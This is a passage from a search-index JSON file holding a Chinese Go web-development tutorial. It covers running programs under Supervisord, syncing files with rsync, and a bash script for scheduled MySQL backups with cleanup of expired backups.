os.Stdout.Fd())\nsyscall.Dup2(fd, os.Stderr.Fd())\n}\n}\n\nreturn 0\n}   </code></pre></li> </ul> <p>\u4e0a\u9762\u63d0\u51fa\u4e86\u4e24\u79cd\u5b9e\u73b0Go\u7684daemon\u65b9\u6848\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u63a8\u8350\u5927\u5bb6\u8fd9\u6837\u53bb\u5b9e\u73b0\uff0c\u56e0\u4e3a\u5b98\u65b9\u8fd8\u6ca1\u6709\u6b63\u5f0f\u7684\u5ba3\u5e03\u652f\u6301daemon\uff0c\u5f53\u7136\u7b2c\u4e00\u79cd\u65b9\u6848\u76ee\u524d\u6765\u770b\u662f\u6bd4\u8f83\u53ef\u884c\u7684\uff0c\u800c\u4e14\u76ee\u524d\u5f00\u6e90\u5e93skynet\u4e5f\u5728\u91c7\u7528\u8fd9\u4e2a\u65b9\u6848\u505adaemon\u3002</p>"},{"location":"12.3/#supervisord","title":"Supervisord","text":"<p>\u4e0a\u9762\u5df2\u7ecf\u4ecb\u7ecd\u4e86Go\u76ee\u524d\u662f\u6709\u4e24\u79cd\u65b9\u6848\u6765\u5b9e\u73b0\u4ed6\u7684daemon\uff0c\u4f46\u662f\u5b98\u65b9\u672c\u8eab\u8fd8\u4e0d\u652f\u6301\u8fd9\u4e00\u5757\uff0c\u6240\u4ee5\u8fd8\u662f\u5efa\u8bae\u5927\u5bb6\u91c7\u7528\u7b2c\u4e09\u65b9\u6210\u719f\u5de5\u5177\u6765\u7ba1\u7406\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u8fd9\u91cc\u6211\u7ed9\u5927\u5bb6\u4ecb\u7ecd\u4e00\u6b3e\u76ee\u524d\u4f7f\u7528\u6bd4\u8f83\u5e7f\u6cdb\u7684\u8fdb\u7a0b\u7ba1\u7406\u8f6f\u4ef6\uff1aSupervisord\u3002Supervisord\u662f\u7528Python\u5b9e\u73b0\u7684\u4e00\u6b3e\u975e\u5e38\u5b9e\u7528\u7684\u8fdb\u7a0b\u7ba1\u7406\u5de5\u5177\u3002supervisord\u4f1a\u5e2e\u4f60\u628a\u7ba1\u7406\u7684\u5e94\u7528\u7a0b\u5e8f\u8f6c\u6210daemon\u7a0b\u5e8f\uff0c\u800c\u4e14\u53ef\u4ee5\u65b9\u4fbf\u7684\u901a\u8fc7\u547d\u4ee4\u5f00\u542f\u3001\u5173\u95ed\u3001\u91cd\u542f\u7b49\u64cd\u4f5c\uff0c\u800c\u4e14\u5b83\u7ba1\u7406\u7684\u8fdb\u7a0b\u4e00\u65e6\u5d29\u6e83\u4f1a\u81ea\u52a8\u91cd\u542f\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u7a0b\u5e8f\u6267\u884c\u4e2d\u65ad\u540e\u7684\u60c5\u51b5\u4e0b\u6709\u81ea\u6211\u4fee\u590d\u7684\u529f\u80fd\u3002</p> <p>\u6211\u524d\u9762\u5728\u5e94\u7528\u4e2d\u8e29\u8fc7\u4e00\u4e2a\u5751\uff0c\u5c31\u662f\u56e0\u4e3a\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u90fd\u662f\u7531Supervisord\u7236\u8fdb\u7a0b\u751f\u51fa\u6765\u7684\uff0c\u90a3\u4e48\u5f53\u4f60\u4fee\u6539\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e4b\u540e\uff0c\u522b\u5fd8\u8bb0\u91cd\u542fSupervisord\uff0c\u5149\u91cd\u542f\u4e0b\u9762\u7684\u5e94\u7528\u7a0b\u5e8f\u6ca1\u7528\u3002\u5f53\u521d\u6211\u5c31\u662f\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u5c31\u5148\u88c5\u4e86Supervisord\uff0c\u7136\u540e\u5f00\u59cb\u90e8\u7f72\u7a0b\u5e8f\uff0c\u4fee\u6539\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u91cd\u542f\u7a0b\u5e8f\uff0c\u4ee5\u4e3a\u6587\u4ef6\u63cf\u8ff0\u7b26\u5df2\u7ecf\u662f100000\u4e86\uff0c\u5176\u5b9eSupervisord\u8fd9\u4e2a\u65f6\u5019\u8fd8\u662f\u9ed8\u8ba4\u76841024\u4e2a\uff0c\u5bfc\u81f4\u4ed6\u7ba1\u7406\u7684\u8fdb\u7a0b\u6240\u6709\u7684\u63cf\u8ff0\u7b26\u4e5f\u662f1024.\u5f00\u653e\u4e4b\u540e\u538b\u529b\u4e00\u4e0a\u6765\u7cfb\u7edf\u5c31\u5f00\u59cb\u62a5\u6587\u4ef6\u63cf\u8ff0\u7b26\u7528\u5149\u4e86\uff0c\u67e5\u4e86\u5f88\u4e45\u624d\u627e\u5230\u8fd9\u4e2a\u5751\u3002</p>"},{"location":"12.3/#supervisord_1","title":"Supervisord\u5b89\u88c5","text":"<p>Supervisord\u53ef\u4ee5\u901a\u8fc7<code>sudo easy_install supervisor</code>\u5b89\u88c5\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7Supervisord\u5b98\u7f51\u4e0b\u8f7d\u540e\u89e3\u538b\u5e76\u8f6c\u5230\u6e90\u7801\u6240\u5728\u7684\u6587\u4ef6\u5939\u4e0b\u6267\u884c<code>setup.py install</code>\u6765\u5b89\u88c5\u3002</p> <ul> <li> <p>\u4f7f\u7528easy_install\u5fc5\u987b\u5b89\u88c5setuptools</p> <p>\u6253\u5f00<code>http://pypi.python.org/pypi/setuptools#files</code>\uff0c\u6839\u636e\u4f60\u7cfb\u7edf\u7684python\u7684\u7248\u672c\u4e0b\u8f7d\u76f8\u5e94\u7684\u6587\u4ef6\uff0c\u7136\u540e\u6267\u884c<code>sh setuptoolsxxxx.egg</code>\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528easy_install\u547d\u4ee4\u6765\u5b89\u88c5Supervisord\u3002</p> </li> </ul>"},{"location":"12.3/#supervisord_2","title":"Supervisord\u914d\u7f6e","text":"<p>Supervisord\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e3a/etc/supervisord.conf\uff0c\u901a\u8fc7\u6587\u672c\u7f16\u8f91\u5668\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u7684\u914d\u7f6e\u6587\u4ef6\uff1a</p> <pre><code>;/etc/supervisord.conf\n[unix_http_server]\nfile = /var/run/supervisord.sock\nchmod = 0777\nchown= root:root\n\n[inet_http_server]\n# Web\u7ba1\u7406\u754c\u9762\u8bbe\u5b9a\nport=9001\nusername = admin\npassword = yourpassword\n\n[supervisorctl]\n; \u5fc5\u987b\u548c'unix_http_server'\u91cc\u9762\u7684\u8bbe\u5b9a\u5339\u914d\nserverurl = unix:///var/run/supervisord.sock\n\n[supervisord]\nlogfile=/var/log/supervisord/supervisord.log ; (main log file;default $CWD/supervisord.log)\nlogfile_maxbytes=50MB       ; (max main logfile bytes b4 rotation;default 50MB)\nlogfile_backups=10          ; (num of main logfile rotation backups;default 10)\nloglevel=info               ; (log level;default info; others: debug,warn,trace)\npidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)\nnodaemon=true              ; (start in foreground if true;default false)\nminfds=1024                 ; (min. avail startup file descriptors;default 1024)\nminprocs=200                ; (min. avail process descriptors;default 200)\nuser=root                 ; (default is current user, required if root)\nchildlogdir=/var/log/supervisord/            ; ('AUTO' child log dir, default $TEMP)\n\n[rpcinterface:supervisor]\nsupervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface\n\n; \u7ba1\u7406\u7684\u5355\u4e2a\u8fdb\u7a0b\u7684\u914d\u7f6e\uff0c\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2aprogram\n[program:blogdemon]\ncommand=/data/blog/blogdemon\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/blogdemon.log\n</code></pre>"},{"location":"12.3/#supervisord_3","title":"Supervisord\u7ba1\u7406","text":"<p>Supervisord\u5b89\u88c5\u5b8c\u6210\u540e\u6709\u4e24\u4e2a\u53ef\u7528\u7684\u547d\u4ee4\u884csupervisor\u548csupervisorctl\uff0c\u547d\u4ee4\u4f7f\u7528\u89e3\u91ca\u5982\u4e0b\uff1a</p> <ul> <li>supervisord\uff0c\u521d\u59cb\u542f\u52a8Supervisord\uff0c\u542f\u52a8\u3001\u7ba1\u7406\u914d\u7f6e\u4e2d\u8bbe\u7f6e\u7684\u8fdb\u7a0b\u3002</li> <li>supervisorctl stop programxxx\uff0c\u505c\u6b62\u67d0\u4e00\u4e2a\u8fdb\u7a0b(programxxx)\uff0cprogramxxx\u4e3a[program:blogdemon]\u91cc\u914d\u7f6e\u7684\u503c\uff0c\u8fd9\u4e2a\u793a\u4f8b\u5c31\u662fblogdemon\u3002</li> <li>supervisorctl start programxxx\uff0c\u542f\u52a8\u67d0\u4e2a\u8fdb\u7a0b</li> <li>supervisorctl restart programxxx\uff0c\u91cd\u542f\u67d0\u4e2a\u8fdb\u7a0b</li> <li>supervisorctl stop all\uff0c\u505c\u6b62\u5168\u90e8\u8fdb\u7a0b\uff0c\u6ce8\uff1astart\u3001restart\u3001stop\u90fd\u4e0d\u4f1a\u8f7d\u5165\u6700\u65b0\u7684\u914d\u7f6e\u6587\u4ef6\u3002</li> <li>supervisorctl reload\uff0c\u8f7d\u5165\u6700\u65b0\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u6309\u65b0\u7684\u914d\u7f6e\u542f\u52a8\u3001\u7ba1\u7406\u6240\u6709\u8fdb\u7a0b\u3002</li> </ul>"},{"location":"12.3/#_1","title":"\u5c0f\u7ed3","text":"<p>\u8fd9\u5c0f\u8282\u6211\u4eec\u4ecb\u7ecd\u4e86Go\u5982\u4f55\u5b9e\u73b0daemon\u5316\uff0c\u4f46\u662f\u7531\u4e8e\u76ee\u524dGo\u7684daemon\u5b9e\u73b0\u7684\u4e0d\u8db3\uff0c\u9700\u8981\u4f9d\u9760\u7b2c\u4e09\u65b9\u5de5\u5177\u6765\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u7684daemon\u7ba1\u7406\u7684\u65b9\u5f0f\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u7528python\u5199\u7684\u8fdb\u7a0b\u7ba1\u7406\u5de5\u5177Supervisord\uff0c\u901a\u8fc7Supervisord\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u628a\u6211\u4eec\u7684Go\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u8d77\u6765\u3002</p>"},{"location":"12.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7f51\u7ad9\u9519\u8bef\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: \u5907\u4efd\u548c\u6062\u590d</li> </ul>"},{"location":"12.4/","title":"12.4 \u5907\u4efd\u548c\u6062\u590d","text":"<p>\u8fd9\u5c0f\u8282\u6211\u4eec\u8981\u8ba8\u8bba\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u7684\u53e6\u4e00\u4e2a\u65b9\u9762\uff1a\u751f\u4ea7\u670d\u52a1\u5668\u4e0a\u6570\u636e\u7684\u5907\u4efd\u548c\u6062\u590d\u3002\u6211\u4eec\u7ecf\u5e38\u4f1a\u9047\u5230\u751f\u4ea7\u670d\u52a1\u5668\u7684\u7f51\u7edc\u65ad\u4e86\u3001\u786c\u76d8\u574f\u4e86\u3001\u64cd\u4f5c\u7cfb\u7edf\u5d29\u6e83\u3001\u6216\u8005\u6570\u636e\u5e93\u4e0d\u53ef\u7528\u4e86\u7b49\u5404\u79cd\u5f02\u5e38\u60c5\u51b5\uff0c\u6240\u4ee5\u7ef4\u62a4\u4eba\u5458\u9700\u8981\u5bf9\u751f\u4ea7\u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u548c\u6570\u636e\u505a\u597d\u5f02\u5730\u707e\u5907\uff0c\u51b7\u5907\u70ed\u5907\u7684\u51c6\u5907\u3002\u5728\u63a5\u4e0b\u6765\u7684\u4ecb\u7ecd\u4e2d\uff0c\u8bb2\u89e3\u4e86\u5982\u4f55\u5907\u4efd\u5e94\u7528\u3001\u5982\u4f55\u5907\u4efd/\u6062\u590dMysql\u6570\u636e\u5e93\u548credis\u6570\u636e\u5e93\u3002</p>"},{"location":"12.4/#_1","title":"\u5e94\u7528\u5907\u4efd","text":"<p>\u5728\u5927\u591a\u6570\u96c6\u7fa4\u73af\u5883\u4e0b\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u57fa\u672c\u4e0d\u9700\u8981\u5907\u4efd\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u4ee3\u7801\u526f\u672c\uff0c\u6211\u4eec\u5728\u672c\u5730\u5f00\u53d1\u73af\u5883\u4e2d\uff0c\u6216\u8005\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u4fdd\u6301\u8fd9\u4e9b\u4ee3\u7801\u3002\u4f46\u662f\u5f88\u591a\u65f6\u5019\uff0c\u4e00\u4e9b\u5f00\u53d1\u7684\u7ad9\u70b9\u9700\u8981\u7528\u6237\u6765\u4e0a\u4f20\u6587\u4ef6\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u5bf9\u8fd9\u4e9b\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u5907\u4efd\u3002\u76ee\u524d\u5176\u5b9e\u6709\u4e00\u79cd\u5408\u9002\u7684\u505a\u6cd5\u5c31\u662f\u628a\u548c\u7f51\u7ad9\u76f8\u5173\u7684\u9700\u8981\u5b58\u50a8\u7684\u6587\u4ef6\u5b58\u50a8\u5230\u4e91\u50a8\u5b58\uff0c\u8fd9\u6837\u5373\u4f7f\u7cfb\u7edf\u5d29\u6e83\uff0c\u53ea\u8981\u6211\u4eec\u7684\u6587\u4ef6\u8fd8\u5728\u4e91\u5b58\u50a8\u4e0a\uff0c\u81f3\u5c11\u6570\u636e\u4e0d\u4f1a\u4e22\u5931\u3002</p> <p>\u5982\u679c\u6211\u4eec\u6ca1\u6709\u91c7\u7528\u4e91\u50a8\u5b58\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u4f55\u505a\u5230\u7f51\u7ad9\u7684\u5907\u4efd\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u4e00\u4e2a\u6587\u4ef6\u540c\u6b65\u5de5\u5177rsync\uff1arsync\u80fd\u591f\u5b9e\u73b0\u7f51\u7ad9\u7684\u5907\u4efd\uff0c\u4e0d\u540c\u7cfb\u7edf\u7684\u6587\u4ef6\u7684\u540c\u6b65\uff0c\u5982\u679c\u662fwindows\u7684\u8bdd\uff0c\u9700\u8981windows\u7248\u672ccwrsync\u3002</p>"},{"location":"12.4/#rsync","title":"rsync\u5b89\u88c5","text":"<p>rysnc\u7684\u5b98\u65b9\u7f51\u7ad9\uff1ahttp://rsync.samba.org/ \u53ef\u4ee5\u4ece\u4e0a\u9762\u83b7\u53d6\u6700\u65b0\u7248\u672c\u7684\u6e90\u7801\u3002\u5f53\u7136\uff0c\u56e0\u4e3arsync\u662f\u4e00\u6b3e\u975e\u5e38\u6709\u7528\u7684\u8f6f\u4ef6\uff0c\u6240\u4ee5\u5f88\u591aLinux\u7684\u53d1\u884c\u7248\u672c\u90fd\u5c06\u5b83\u6536\u5f55\u5728\u5185\u4e86\u3002</p> <p>\u8f6f\u4ef6\u5305\u5b89\u88c5</p> <pre><code># sudo apt-get  install  rsync  \u6ce8\uff1a\u5728debian\u3001ubuntu \u7b49\u5728\u7ebf\u5b89\u88c5\u65b9\u6cd5\uff1b\n# yum install rsync    \u6ce8\uff1aFedora\u3001Redhat\u3001CentOS \u7b49\u5728\u7ebf\u5b89\u88c5\u65b9\u6cd5\uff1b\n# rpm -ivh rsync       \u6ce8\uff1aFedora\u3001Redhat\u3001CentOS \u7b49rpm\u5305\u5b89\u88c5\u65b9\u6cd5\uff1b\n</code></pre> <p>\u5176\u5b83Linux\u53d1\u884c\u7248\uff0c\u8bf7\u7528\u76f8\u5e94\u7684\u8f6f\u4ef6\u5305\u7ba1\u7406\u65b9\u6cd5\u6765\u5b89\u88c5\u3002\u6e90\u7801\u5305\u5b89\u88c5</p> <pre><code>tar xvf  rsync-xxx.tar.gz\ncd rsync-xxx\n./configure --prefix=/usr  ;make ;make install   \u6ce8\uff1a\u5728\u7528\u6e90\u7801\u5305\u7f16\u8bd1\u5b89\u88c5\u4e4b\u524d\uff0c\u60a8\u5f97\u5b89\u88c5gcc\u7b49\u7f16\u8bd1\u5de5\u5177\u624d\u884c\uff1b\n</code></pre>"},{"location":"12.4/#rsync_1","title":"rsync\u914d\u7f6e","text":"<p>rsync\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u4e2a\u914d\u7f6e\u6587\u4ef6rsyncd.conf(\u4e3b\u914d\u7f6e\u6587\u4ef6)\u3001rsyncd.secrets(\u5bc6\u7801\u6587\u4ef6)\u3001rsyncd.motd(rysnc\u670d\u52a1\u5668\u4fe1\u606f)\u3002</p> <p>\u5173\u4e8e\u8fd9\u51e0\u4e2a\u6587\u4ef6\u7684\u914d\u7f6e\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003\u5b98\u65b9\u7f51\u7ad9\u6216\u8005\u5176\u4ed6\u4ecb\u7ecdrsync\u7684\u7f51\u7ad9\uff0c\u4e0b\u9762\u4ecb\u7ecd\u670d\u52a1\u5668\u7aef\u548c\u5ba2\u6237\u7aef\u5982\u4f55\u5f00\u542f</p> <ul> <li> <p>\u670d\u52a1\u7aef\u5f00\u542f\uff1a</p> <pre><code>#/usr/bin/rsync --daemon  --config=/etc/rsyncd.conf\n</code></pre> <p>--daemon\u53c2\u6570\u65b9\u5f0f\uff0c\u662f\u8ba9rsync\u4ee5\u670d\u52a1\u5668\u6a21\u5f0f\u8fd0\u884c\u3002\u628arsync\u52a0\u5165\u5f00\u673a\u542f\u52a8</p> <pre><code>echo 'rsync --daemon' &gt;&gt; /etc/rc.d/rc.local\n</code></pre> <p>\u8bbe\u7f6ersync\u5bc6\u7801</p> <pre><code>echo '\u4f60\u7684\u7528\u6237\u540d:\u4f60\u7684\u5bc6\u7801' &gt; /etc/rsyncd.secrets\nchmod 600 /etc/rsyncd.secrets\n</code></pre> </li> <li> <p>\u5ba2\u6237\u7aef\u540c\u6b65\uff1a</p> <p>\u5ba2\u6237\u7aef\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u540c\u6b65\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff1a</p> <pre><code>rsync -avzP  --delete  --password-file=rsyncd.secrets   \u7528\u6237\u540d@192.168.145.5::www /var/rsync/backup\n</code></pre> <p>\u8fd9\u6761\u547d\u4ee4\uff0c\u7b80\u8981\u7684\u8bf4\u660e\u4e00\u4e0b\u51e0\u4e2a\u8981\u70b9\uff1a</p> <ol> <li>-avzP\u662f\u5565\uff0c\u8bfb\u8005\u53ef\u4ee5\u4f7f\u7528--help\u67e5\u770b</li> <li>--delete \u662f\u4e3a\u4e86\u6bd4\u5982A\u4e0a\u5220\u9664\u4e86\u4e00\u4e2a\u6587\u4ef6\uff0c\u540c\u6b65\u7684\u65f6\u5019\uff0cB\u4f1a\u81ea\u52a8\u5220\u9664\u76f8\u5bf9\u5e94\u7684\u6587\u4ef6</li> <li>--password-file \u5ba2\u6237\u7aef\u4e2d/etc/rsyncd.secrets\u8bbe\u7f6e\u7684\u5bc6\u7801\uff0c\u8981\u548c\u670d\u52a1\u7aef\u7684 /etc/rsyncd.secrets \u4e2d\u7684\u5bc6\u7801\u4e00\u6837\uff0c\u8fd9\u6837cron\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u5c31\u4e0d\u9700\u8981\u5bc6\u7801\u4e86</li> <li>\u8fd9\u6761\u547d\u4ee4\u4e2d\u7684\"\u7528\u6237\u540d\"\u4e3a\u670d\u52a1\u7aef\u7684 /etc/rsyncd.secrets\u4e2d\u7684\u7528\u6237\u540d</li> <li>\u8fd9\u6761\u547d\u4ee4\u4e2d\u7684 192.168.145.5 \u4e3a\u670d\u52a1\u7aef\u7684IP\u5730\u5740</li> <li>::www\uff0c\u6ce8\u610f\u662f2\u4e2a : \u53f7\uff0cwww\u4e3a\u670d\u52a1\u7aef\u7684\u914d\u7f6e\u6587\u4ef6 /etc/rsyncd.conf \u4e2d\u7684[www]\uff0c\u610f\u601d\u662f\u6839\u636e\u670d\u52a1\u7aef\u4e0a\u7684/etc/rsyncd.conf\u6765\u540c\u6b65\u5176\u4e2d\u7684[www]\u6bb5\u5185\u5bb9\uff0c\u4e00\u4e2a : \u53f7\u7684\u65f6\u5019\uff0c\u7528\u4e8e\u4e0d\u6839\u636e\u914d\u7f6e\u6587\u4ef6\uff0c\u76f4\u63a5\u540c\u6b65\u6307\u5b9a\u76ee\u5f55\u3002</li> </ol> <p>\u4e3a\u4e86\u8ba9\u540c\u6b65\u5b9e\u65f6\u6027\uff0c\u53ef\u4ee5\u8bbe\u7f6ecrontab\uff0c\u4fdd\u6301rsync\u6bcf\u5206\u949f\u540c\u6b65\uff0c\u5f53\u7136\u7528\u6237\u4e5f\u53ef\u4ee5\u6839\u636e\u6587\u4ef6\u7684\u91cd\u8981\u7a0b\u5ea6\u8bbe\u7f6e\u4e0d\u540c\u7684\u540c\u6b65\u9891\u7387\u3002</p> </li> </ul>"},{"location":"12.4/#mysql","title":"MySQL\u5907\u4efd","text":"<p>\u5e94\u7528\u6570\u636e\u5e93\u76ee\u524d\u8fd8\u662fMySQL\u4e3a\u4e3b\u6d41\uff0c\u76ee\u524dMySQL\u7684\u5907\u4efd\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a\u70ed\u5907\u4efd\u548c\u51b7\u5907\u4efd\uff0c\u70ed\u5907\u4efd\u76ee\u524d\u4e3b\u8981\u662f\u91c7\u7528master/slave\u65b9\u5f0f\uff08master/slave\u65b9\u5f0f\u7684\u540c\u6b65\u76ee\u524d\u4e3b\u8981\u7528\u4e8e\u6570\u636e\u5e93\u8bfb\u5199\u5206\u79bb\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u70ed\u5907\u4efd\u6570\u636e\uff09\uff0c\u5173\u4e8e\u5982\u4f55\u914d\u7f6e\u8fd9\u65b9\u9762\u7684\u8d44\u6599\uff0c\u5927\u5bb6\u53ef\u4ee5\u627e\u5230\u5f88\u591a\u3002\u51b7\u5907\u4efd\u7684\u8bdd\u5c31\u662f\u6570\u636e\u6709\u4e00\u5b9a\u7684\u5ef6\u8fdf\uff0c\u4f46\u662f\u53ef\u4ee5\u4fdd\u8bc1\u8be5\u65f6\u95f4\u6bb5\u4e4b\u524d\u7684\u6570\u636e\u5b8c\u6574\uff0c\u4f8b\u5982\u6709\u4e9b\u65f6\u5019\u53ef\u80fd\u6211\u4eec\u7684\u8bef\u64cd\u4f5c\u5f15\u8d77\u4e86\u6570\u636e\u7684\u4e22\u5931\uff0c\u90a3\u4e48master/slave\u6a21\u5f0f\u662f\u65e0\u6cd5\u627e\u56de\u4e22\u5931\u6570\u636e\u7684\uff0c\u4f46\u662f\u901a\u8fc7\u51b7\u5907\u4efd\u53ef\u4ee5\u90e8\u5206\u6062\u590d\u6570\u636e\u3002</p> <p>\u51b7\u5907\u4efd\u4e00\u822c\u4f7f\u7528shell\u811a\u672c\u6765\u5b9e\u73b0\u5b9a\u65f6\u5907\u4efd\u6570\u636e\u5e93\uff0c\u7136\u540e\u901a\u8fc7\u4e0a\u9762\u4ecb\u7ecdrsync\u540c\u6b65\u975e\u672c\u5730\u673a\u623f\u7684\u4e00\u53f0\u670d\u52a1\u5668\u3002</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u662f\u5b9a\u65f6\u5907\u4efdmysql\u7684\u5907\u4efd\u811a\u672c\uff0c\u6211\u4eec\u4f7f\u7528\u4e86mysqldump\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u628a\u6570\u636e\u5e93\u5bfc\u51fa\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u3002</p> <pre><code>#!/bin/bash\n\n# \u4ee5\u4e0b\u914d\u7f6e\u4fe1\u606f\u8bf7\u81ea\u5df1\u4fee\u6539\nmysql_user=\"USER\" #MySQL\u5907\u4efd\u7528\u6237\nmysql_password=\"PASSWORD\" #MySQL\u5907\u4efd\u7528\u6237\u7684\u5bc6\u7801\nmysql_host=\"localhost\"\nmysql_port=\"3306\"\nmysql_charset=\"utf8\" #MySQL\u7f16\u7801\nbackup_db_arr=(\"db1\" \"db2\") #\u8981\u5907\u4efd\u7684\u6570\u636e\u5e93\u540d\u79f0\uff0c\u591a\u4e2a\u7528\u7a7a\u683c\u5206\u5f00\u9694\u5f00 \u5982(\"db1\" \"db2\" \"db3\")\nbackup_location=/var/www/mysql  #\u5907\u4efd\u6570\u636e\u5b58\u653e\u4f4d\u7f6e\uff0c\u672b\u5c3e\u8bf7\u4e0d\u8981\u5e26\"/\",\u6b64\u9879\u53ef\u4ee5\u4fdd\u6301\u9ed8\u8ba4\uff0c\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u521b\u5efa\u6587\u4ef6\u5939\nexpire_backup_delete=\"ON\" #\u662f\u5426\u5f00\u542f\u8fc7\u671f\u5907\u4efd\u5220\u9664 ON\u4e3a\u5f00\u542f OFF\u4e3a\u5173\u95ed\nexpire_days=3 #\u8fc7\u671f\u65f6\u95f4\u5929\u6570 \u9ed8\u8ba4\u4e3a\u4e09\u5929\uff0c\u6b64\u9879\u53ea\u6709\u5728expire_backup_delete\u5f00\u542f\u65f6\u6709\u6548\n\n# \u672c\u884c\u5f00\u59cb\u4ee5\u4e0b\u4e0d\u9700\u8981\u4fee\u6539\nbackup_time=`date +%Y%m%d%H%M`  #\u5b9a\u4e49\u5907\u4efd\u8be6\u7ec6\u65f6\u95f4\nbackup_Ymd=`date +%Y-%m-%d` #\u5b9a\u4e49\u5907\u4efd\u76ee\u5f55\u4e2d\u7684\u5e74\u6708\u65e5\u65f6\u95f4\nbackup_3ago=`date -d '3 days ago' +%Y-%m-%d` #3\u5929\u4e4b\u524d\u7684\u65e5\u671f\nbackup_dir=$backup_location/$backup_Ymd  #\u5907\u4efd\u6587\u4ef6\u5939\u5168\u8def\u5f84\nwelcome_msg=\"Welcome to use MySQL backup tools!\" #\u6b22\u8fce\u8bed\n\n# \u5224\u65adMYSQL\u662f\u5426\u542f\u52a8,mysql\u6ca1\u6709\u542f\u52a8\u5219\u5907\u4efd\u9000\u51fa\nmysql_ps=`ps -ef |grep mysql |wc -l`\nmysql_listen=`netstat -an |grep LISTEN |grep $mysql_port|wc -l`\nif [ [$mysql_ps == 0] -o [$mysql_listen == 0] ]; then\n        echo \"ERROR:MySQL is not running! backup stop!\"\n        exit\nelse\n        echo $welcome_msg\nfi\n\n# \u8fde\u63a5\u5230mysql\u6570\u636e\u5e93\uff0c\u65e0\u6cd5\u8fde\u63a5\u5219\u5907\u4efd\u9000\u51fa\nmysql -h$mysql_host -P$mysql_port -u$mysql_user -p$mysql_password &lt;&lt;end\nuse mysql;\nselect host,user from user where user='root' and host='localhost';\nexit\nend\n\nflag=`echo $?`\nif [ $flag != \"0\" ]; then\n        echo \"ERROR:Can't connect mysql server! backup stop!\"\n        exit\nelse\n        echo \"MySQL connect ok! Please wait......\"\n        # \u5224\u65ad\u6709\u6ca1\u6709\u5b9a\u4e49\u5907\u4efd\u7684\u6570\u636e\u5e93\uff0c\u5982\u679c\u5b9a\u4e49\u5219\u5f00\u59cb\u5907\u4efd\uff0c\u5426\u5219\u9000\u51fa\u5907\u4efd\n        if [ \"$backup_db_arr\" != \"\" ];then\n                #dbnames=$(cut -d ',' -f1-5 $backup_database)\n                #echo \"arr is (${backup_db_arr[@]})\"\n                for dbname in ${backup_db_arr[@]}\n                do\n                        echo \"database $dbname backup start...\"\n                        `mkdir -p $backup_dir`\n                        `mysqldump -h$mysql_host -P$mysql_port -u$mysql_user -p$mysql_password $dbname --default-character-set=$mysql_charset | gzip &gt; $backup_dir/$dbname-$backup_time.sql.gz`\n                        flag=`echo $?`\n                        if [ $flag == \"0\" ];then\n                                echo \"database $dbname success backup to $backup_dir/$dbname-$backup_time.sql.gz\"\n                        else\n                                echo \"database $dbname backup fail!\"\n                        fi\n\n                done\n        else\n                echo \"ERROR:No database to backup! backup stop\"\n                exit\n        fi\n        # \u5982\u679c\u5f00\u542f\u4e86\u5220\u9664\u8fc7\u671f\u5907\u4efd\uff0c\u5219\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\n        if [ \"$expire_backup_delete\" == \"ON\" -a  \"$backup_location\" != \"\" ];then\n                 #`find $backup_location/ -type d -o -type f -ctime +$expire_days -exec rm -rf {} \\;`\n                 `find $backup_location/ -type d -mtime +$expire_days | xargs rm -rf`\n                 echo \"Expired backup data delete complete!\"\n        fi\n        echo \"All database backup success! Thank you!\"\n        exit\nfi\n</code></pre> <p>\u4fee\u6539shell\u811a\u672c\u7684\u5c5e\u6027\uff1a</p> <pre><code>chmod 600 /root/mysql_backup.sh\nchmod +x /root/mysql_backup.sh\n</code></pre> 